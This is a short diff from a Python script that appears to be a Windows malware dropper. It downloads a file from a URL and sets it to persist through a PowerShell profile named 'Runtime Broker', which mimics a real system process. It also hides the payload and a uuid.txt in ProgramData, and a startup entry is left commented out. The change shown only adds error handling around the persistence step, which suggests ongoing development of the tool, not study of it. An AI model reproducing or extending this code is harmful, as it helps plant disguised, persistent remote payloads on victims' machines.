@@ -93,7 +93,10 @@ def run(url):
             with open(file_path, 'wb') as file:
               file.write(response.content)
                 
-        create_powershell_profile(file_path, "Runtime Broker")
+        try:
+            create_powershell_profile(file_path, "Runtime Broker")
+        except:
+            print("could not add powershell profile")
         create_hidden_file(file_path)
         create_hidden_file("C:\\ProgramData\\uuid.txt")
         #add_to_startup(file_path, "Runtime Broker")
